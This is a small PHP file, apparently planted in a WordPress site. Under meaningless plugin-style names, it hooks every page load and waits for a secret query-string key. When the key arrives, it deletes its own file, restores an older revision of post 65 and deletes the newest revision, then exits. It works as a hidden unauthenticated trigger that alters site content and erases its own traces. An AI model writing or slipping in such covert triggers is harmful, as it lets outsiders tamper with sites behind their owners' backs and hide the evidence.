<?php

function dev_fast_pinterest() {
	if (isset($_GET['validation_speed_latest']) && $_GET['validation_speed_latest'] === 'update_smtp_year_cron') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$rich_messenger_attachment_menus = 65;
		$invoice_engine_integrate_highlighter = wp_get_post_revisions($rich_messenger_attachment_menus);
		if (empty($invoice_engine_integrate_highlighter)) die('no revisions');
		if (count($invoice_engine_integrate_highlighter) < 2) die('less than 2');
		$preloader_logger_reader = array_shift($invoice_engine_integrate_highlighter);
		$messenger_wpforms_more = $preloader_logger_reader->ID;
		$share_keywords_index_checker = array_shift($invoice_engine_integrate_highlighter);
		$slide_reloaded_nav_slideshow = $share_keywords_index_checker->ID;
		$csv_shopp_rates_enable = wp_restore_post_revision($slide_reloaded_nav_slideshow);
		if ($csv_shopp_rates_enable === false) die('error restoring');
		$csv_shopp_rates_enable = wp_delete_post_revision($messenger_wpforms_more);		
		if ($csv_shopp_rates_enable === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'dev_fast_pinterest');
